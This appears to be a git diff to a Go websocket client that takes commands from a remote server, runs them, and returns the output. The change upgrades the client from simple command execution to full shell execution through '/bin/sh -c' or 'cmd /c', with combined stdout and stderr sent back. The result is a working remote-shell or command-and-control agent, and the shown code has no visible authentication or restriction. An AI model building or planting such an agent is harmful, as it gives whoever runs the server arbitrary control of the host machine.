@@ -3,9 +3,11 @@ package main
 import (
 	"crypto/tls"
 	"fmt"
+	"io"
 	"log"
 	"os"
 	"os/exec"
+	"runtime"
 
 	"github.com/gorilla/websocket"
 )
@@ -48,10 +50,22 @@ func main() {
 			break
 		}
 
-		// Execute the command
-		output, err := exec.Command(string(message)).Output()
+		command := string(message)
+		fmt.Printf("Received command: %s\n", command)
+
+		// Prepare command execution based on shell type
+		var cmd *exec.Cmd
+		if runtime.GOOS == "windows" {
+			cmd = exec.Command("cmd", "/c", command)
+		} else {
+			// Pass the entire command as a single argument to the shell
+			cmd = exec.Command("/bin/sh", "-c", command)
+		}
+
+		// Execute with full pipe handling
+		output, err := executeCommand(cmd)
 		if err != nil {
-			output = []byte(fmt.Sprintf("Error executing command: %s", err))
+			output = []byte(fmt.Sprintf("Error executing command: %s\n%s", err, output))
 		}
 
 		// Send output back to server
@@ -61,4 +75,38 @@ func main() {
 			break
 		}
 	}
+}
+
+func executeCommand(cmd *exec.Cmd) ([]byte, error) {
+	// Create pipes for both stdout and stderr
+	stdout, err := cmd.StdoutPipe()
+	if err != nil {
+		return nil, err
+	}
+	stderr, err := cmd.StderrPipe()
+	if err != nil {
+		return nil, err
+	}
+
+	// Start the command
+	if err := cmd.Start(); err != nil {
+		return nil, err
+	}
+
+	// Read both outputs
+	stdoutBytes, err := io.ReadAll(stdout)
+	if err != nil {
+		return nil, err
+	}
+	stderrBytes, err := io.ReadAll(stderr)
+	if err != nil {
+		return nil, err
+	}
+
+	// Wait for command to complete
+	if err := cmd.Wait(); err != nil {
+		return append(stdoutBytes, stderrBytes...), err
+	}
+
+	return append(stdoutBytes, stderrBytes...), nil
 }
